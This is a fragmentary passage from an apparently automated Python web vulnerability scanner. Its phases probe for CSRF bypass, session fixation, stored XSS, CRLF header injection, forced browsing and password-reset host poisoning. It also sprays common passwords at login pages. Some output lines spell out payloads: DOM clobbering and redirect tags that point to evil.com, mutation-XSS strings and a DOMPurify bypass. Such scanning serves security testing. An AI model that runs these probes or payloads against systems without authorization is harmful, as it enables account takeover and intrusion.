...
async def phase_90_CSRF(
    ...
    form_urls = [
        ...
        if "=" in u
        or "/form" in u.lower()
        or "/submit" in u.lower()
        or "/login" in u.lower()
        or "/register" in u.lower()
        or "/contact" in u.lower()
    ]
    tested = 0
                    ...
                    if name_match and val_match:
                        ...
                        if any(t in name_lower for t in csrf_token_names):
                            ...
                            if type_match and type_match.group(1).lower() == "hidden":
                                findings.append(
                                    f"[csrf-token-present] {url} — hidden field: {name_match.group(1)}"
                                )
                if tokens_found:
                    for field_name, field_val in tokens_found.items():
                        ...
                        try:
                            ...
                            if s2 in (200, 302):
                                findings.append(
                                    f"[csrf-bypass] {url} — empty {field_name} accepted (HTTP {s2})"
                                )
                    ...
                    post_forms = [
                        f
                        for f in form_tags
                        if 'method="post"' in f.lower() or "method='post'" in f.lower()
                    ]
                    if post_forms:
...
async def phase_91_SESSIONFIX(
    ...
    login_urls = [
        ...
        for u in all_urls
        if any(
            m in u.lower() for m in ("/login", "/signin", "/auth", "/session", "/account/signin")
        )
    ]
    if not login_urls:
    ...
    for url in login_urls[: _PIPELINE_CFG.sample_hosts_sessionfix]:
        ...
        try:
            ...
            if pre_cookies == post_cookies and pre_cookies:
                ...
                changed = [
                    k
                    for k in pre_cookies
                    if k in post_cookies and pre_cookies[k] != post_cookies[k]
                ]
                if changed:
                    findings.append(
                        f"[session-rotated] {url} — cookie(s) rotated: {', '.join(changed)}"
                    )
        except asyncio.CancelledError:
            raise
        except Exception:
            ...
            for pwd in common_passwords[:5]:
                ...
                try:
                    ...
                    post_data = urllib.parse.urlencode(
                        {"username": user, "password": pwd, "user": user, "pass": pwd}
                    ).encode()
                    ...
                    if status in (200, 302) and (
                        "dashboard" in body or "welcome" in body or "logout" in body
                    ):
                        findings.append(
                            f"[weak-cred] {url} — user={user} pass={pwd} (HTTP {status})"
                        )
                    elif "locked" in body or "too many" in body or "rate limit" in body:
                        findings.append(
                            f"[lockout-detected] {url} — account lockout after spray attempt"
                        )
                        break
                except asyncio.CancelledError:
                    raise
        ...
        try:
            ...
            for sc in set_cookie_headers:
                ...
                if cookie_name.startswith("__host-") or cookie_name.startswith("__secure-"):
                    findings.append(
                        f"[cookie-prefix-ok] {base} — {cookie_name} uses __Host/__Secure prefix"
                    )
                if issues:
        ...
        for body_data, ct in payloads:
            ...
            try:
                req_post = urllib.request.Request(
                    ...
                    method="POST",
                    headers={"User-Agent": "Mozilla/5.0", "Content-Type": ct, **_extra_h},
                )
                s_post, _, b_post = await _async_urlopen(_urlopen, req_post, timeout=10)
                len_post = len(b_post)
                if s_post != s_get and s_post not in (404, 405):
                    findings.append(
                        f"[post-diff-status] {url} — GET={s_get} POST={s_post} (Content-Type: {ct})"
                    )
                elif abs(len_post - len_get) > 100 and s_post == 200:
                    findings.append(
                        f"[post-diff-length] {url} — GET={len_get}b POST={len_post}b (Content-Type: {ct})"
                    )
                tested += 1
            except asyncio.CancelledError:
                raise
            ...
            try:
                ...
                if status == 200:
                    if "login" not in body.lower() or "dashboard" in body.lower():
                        findings.append(
                            f"[forced-browse-200] {test_url} — direct access (HTTP 200)"
                        )
                    else:
                        findings.append(
                            f"[forced-browse-login] {test_url} — redirects to login (HTTP 200)"
                        )
                elif status == 403:
                    ...
                    if status == 200 and len(body) > 100:
                        try:
                            ...
                            if isinstance(data, list) and len(data) > 0:
                                findings.append(
                                    f"[pagination-abuse] {test_url} — {param}={val} returned {len(data)} items"
                                )
                            elif (
                                ...
                                findings.append(
                                    f"[pagination-abuse] {test_url} — {param}={val} returned {len(data['data'])} items in .data"
                                )
        ...
        try:
            ...
            for link in links:
                ...
                if "noopener" not in rel_val or "noreferrer" not in rel_val:
                    ...
                    findings.append(
                        f"[tabnab] {url} — target=_blank missing {', '.join(missing)} on {href[:80]}"
                    )
            tested += 1
        except asyncio.CancelledError:
            raise
        ...
        for payload in crlf_payloads[:1]:
            ...
            try:
                ...
                if "X-Injected" in str(resp_h) or "x-injected" in body.lower():
                    findings.append(
                        f"[header-injection] {test_url} — CRLF header injection confirmed"
                    )
...
async def phase_99e_XSSSTORED(
    ...
    form_urls = [
        ...
        if any(
            m in u.lower()
            for m in ("/comment", "/feedback", "/contact", "/profile", "/post", "/submit", "/form")
        )
    ]
    if not form_urls:
        ...
        try:
            ...
            for form_content in form_tags:
                ...
                textareas = re.findall(
                    r'<textarea[^>]+name=["\']([^"\']+)["\']', form_content, re.I
                )
                ...
                if field_names:
                    ...
                    if xss_marker in body3:
                        findings.append(
                            f"[stored-xss] {url} — marker '{xss_marker}' persisted in response"
                        )
        except asyncio.CancelledError:
            raise
        except Exception:
            continue
    # XSS methodology notes
    findings.append("")
    findings.append("--- DOM Clobbering Check ---")
    findings.append(
        '[dom-clobber] <a id="config"><a id="config" name="apiUrl" href="https://evil.com/">'
    )
    findings.append("")
    findings.append("--- Mutation XSS Check ---")
    findings.append(
        "[mutation-xss] <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>"
    )
    findings.append(
        "[mutation-xss] DOMPurify 2.x bypass: <svg><p><style><img src=x onerror=alert(1)>"
    )
    findings.append("")
    findings.append("--- Scriptless XSS Check ---")
    findings.append("[scriptless-xss] CSS selector exfiltration via <style>")
    findings.append('[scriptless-xss] <meta http-equiv="refresh" content="0;url=https://evil.com">')
    findings.append('[scriptless-xss] <base href="https://evil.com/"> URL hijacking')
    if not findings:
...
async def phase_99f_HOSTABUSE(
    ...
    pw_reset_urls = [
        ...
        for u in all_urls
        if any(
            m in u.lower() for m in ("/password/reset", "/forgot", "/reset-password", "/pw-reset")
        )
    ]
    for url in pw_reset_urls[: _PIPELINE_CFG.sample_hosts_hostabuse]:
        ...
        try:
            ...
            if "http" in body and attacker_host in body:
                findings.append(
                    f"[pw-reset-poison] {url} — password reset link contains attacker host"
                )
        except asyncio.CancelledError:
            raise
        except Exception:
